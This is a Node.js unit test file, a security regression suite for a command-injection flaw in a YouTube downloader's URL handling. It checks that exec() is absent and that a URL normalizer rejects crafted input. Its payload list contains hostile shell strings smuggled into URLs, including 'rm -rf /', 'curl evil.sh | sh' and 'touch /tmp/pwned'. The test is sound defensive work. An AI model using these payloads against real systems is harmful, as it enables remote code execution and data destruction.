// tests/unit/security_shell_injection.test.js
import test from 'node:test';
import assert from 'node:assert';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { normalizeYouTubeUrl, sanitizeVideoId } from '../../utils/downloader.js';

/**
 * Security regression: YouTube URL command injection (audit finding C1).
 *
 * ORIGINAL DEFECT
 * ---------------
 * `utils/downloader.js` interpolated the raw user-supplied URL into shell
 * command strings executed via `child_process.exec`, which runs them through
 * `/bin/sh -c`. Because `routes/api.js` validated URLs with `new URL()` only,
 * a payload such as
 *
 *     https://youtube.com/watch?v=abc$(touch /tmp/pwned)
 *
 * passed validation and executed as shell. `exec()` was confirmed to actually
 * touch /tmp/pwned during the audit — an unauthenticated RCE on a server that
 * exposes POST /api/process.
 *
 * INVARIANT (never regress)
 * -------------------------
 * 1. No source file may use `exec(` / `execAsync(` with an interpolated command.
 * 2. `normalizeYouTubeUrl` must return null for anything that is not a
 *    syntactically valid YouTube video URL.
 * 3. Only an 11-char [A-Za-z0-9_-] video id may ever reach a subprocess argv.
 */

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const REPO_ROOT = path.resolve(__dirname, '..', '..');

// ---------------------------------------------------------------------------
// 1. Static guard: forbid the dangerous exec pattern across the codebase
// ---------------------------------------------------------------------------
test('Security: no shell-string command execution anywhere in utils/workers/routes', async (t) => {
  await t.test('Case 1: `exec(` from child_process is never imported', () => {
    const scanDirs = ['utils', 'workers', 'routes', 'queues'].map((d) => path.join(REPO_ROOT, d));
    const offenders = [];

    for (const dir of scanDirs) {
      if (!existsSync(dir)) continue;
      for (const file of readdirSync(dir)) {
        if (!file.endsWith('.js')) continue;
        const full = path.join(dir, file);
        const src = readFileSync(full, 'utf-8');

        // Catch `import { exec, execSync } from 'child_process'`
        const importMatch = src.match(/import\s*\{([^}]*)\}\s*from\s*['"]child_process['"]/);
        if (importMatch) {
          const named = importMatch[1].split(',').map((s) => s.trim());
          for (const sym of named) {
            if (/^(exec|execSync)$/.test(sym)) {
              offenders.push(`${path.relative(REPO_ROOT, full)} imports ${sym}`);
            }
          }
        }

        // Catch `exec(` / `execSync(` call sites (word-boundary, so execFile is fine)
        const callRe = /(?<![\w.])exec(?:Sync)?\s*\(/g;
        let m;
        while ((m = callRe.exec(src)) !== null) {
          const line = src.slice(0, m.index).split('\n').length;
          offenders.push(`${path.relative(REPO_ROOT, full)}:${line} calls ${m[0].replace(/\s*\($/, '')}()`);
        }
      }
    }

    assert.deepStrictEqual(
      offenders,
      [],
      `Shell-string command execution must not return. Offenders:\n  ${offenders.join('\n  ')}`
    );
  });

  await t.test('Case 2: downloader uses execFile (no-shell) for every yt-dlp call', () => {
    const src = readFileSync(path.join(REPO_ROOT, 'utils', 'downloader.js'), 'utf-8');
    assert.match(src, /from\s*['"]child_process['"]/, 'downloader should import from child_process');
    assert.match(src, /execFile/, 'downloader must use execFile');
    assert.doesNotMatch(src, /promisify\(\s*exec\s*\)/, 'downloader must not promisify exec');
  });
});

// ---------------------------------------------------------------------------
// 2. Runtime guard: injection payloads are rejected outright
// ---------------------------------------------------------------------------
test('Security: URL normalization rejects shell metacharacters and bad hosts', async (t) => {
  const INJECTION_PAYLOADS = [
    'https://youtube.com/watch?v=abc$(touch /tmp/pwned)',
    'https://youtube.com/watch?v=abc`id`',
    'https://youtube.com/watch?v=abc; rm -rf /',
    'https://youtube.com/watch?v=abc|| whoami',
    'https://youtube.com/watch?v=abc&& curl evil.sh | sh',
    'https://youtube.com/watch?v=abc\n touch /tmp/pwned',
    'https://youtube.com/watch?v=dQw4w9WgXcQ$(touch /tmp/pwned)',
    "https://youtube.com/watch?v=abc' ; touch /tmp/pwned ; '",
  ];

  await t.test('Case 1: every injection payload resolves to null', () => {
    for (const payload of INJECTION_PAYLOADS) {
      assert.strictEqual(
        normalizeYouTubeUrl(payload),
        null,
        `Payload must be rejected: ${JSON.stringify(payload)}`
      );
    }
  });

  await t.test('Case 2: non-YouTube hosts are rejected', () => {
    const badHosts = [
      'https://evil.com/watch?v=dQw4w9WgXcQ',
      'https://youtube.com.evil.com/watch?v=dQw4w9WgXcQ',
      'https://notyoutube.com/watch?v=dQw4w9WgXcQ',
      'https://example.org/watch?v=dQw4w9WgXcQ',
      'file:///etc/passwd',
      '--inject-flag',
      'not a url at all',
    ];
    for (const bad of badHosts) {
      assert.strictEqual(normalizeYouTubeUrl(bad), null, `Host must be rejected: ${bad}`);
    }
  });

  await t.test('Case 3: malformed / short / long video ids are rejected', () => {
    const badIds = [
      'https://youtube.com/watch?v=short',
      'https://youtube.com/watch?v=waytoolongvideoid',
      'https://youtube.com/watch?v=ab cd ef gh',
      'https://youtube.com/watch?v=abc$(x)',
      'https://youtube.com/watch?v=',
    ];
    for (const bad of badIds) {
      assert.strictEqual(normalizeYouTubeUrl(bad), null, `Id must be rejected: ${bad}`);
    }
  });
});

// ---------------------------------------------------------------------------
// 3. Canonicalization of the accepted shapes
// ---------------------------------------------------------------------------
test('Security: legitimate YouTube URLs canonicalize to a safe form', async (t) => {
  const cases = [
    ['https://www.youtube.com/watch?v=dQw4w9WgXcQ', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://youtube.com/watch?v=dQw4w9WgXcQ&t=42s', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://m.youtube.com/watch?v=dQw4w9WgXcQ', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://youtu.be/dQw4w9WgXcQ', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://youtu.be/dQw4w9WgXcQ?si=tracking', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://www.youtube.com/shorts/dQw4w9WgXcQ', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://www.youtube.com/live/dQw4w9WgXcQ', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
    ['https://www.youtube.com/embed/dQw4w9WgXcQ', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'],
  ];

  await t.test('Case 1: canonical output is a fixed safe template', () => {
    for (const [input, expected] of cases) {
      assert.strictEqual(normalizeYouTubeUrl(input), expected, `Failed for ${input}`);
    }
  });

  await t.test('Case 2: output never contains shell metacharacters', () => {
    for (const [input] of cases) {
      const out = normalizeYouTubeUrl(input);
      assert.doesNotMatch(out, /[;&|`$(){}<>\\'"\s]/, `Unsafe chars in: ${out}`);
    }
  });

  await t.test('Case 3: sanitizeVideoId enforces the exact 11-char shape', () => {
    assert.strictEqual(sanitizeVideoId('dQw4w9WgXcQ'), 'dQw4w9WgXcQ');
    assert.strictEqual(sanitizeVideoId('  dQw4w9WgXcQ  '), 'dQw4w9WgXcQ', 'trims surrounding whitespace');
    assert.strictEqual(sanitizeVideoId('short'), null);
    assert.strictEqual(sanitizeVideoId('waytoolongvideoid'), null);
    assert.strictEqual(sanitizeVideoId('dQw4w9WgXc$'), null);
    assert.strictEqual(sanitizeVideoId(''), null);
    assert.strictEqual(sanitizeVideoId(null), null);
    assert.strictEqual(sanitizeVideoId(undefined), null);
    assert.strictEqual(sanitizeVideoId(12345), null);
  });
});
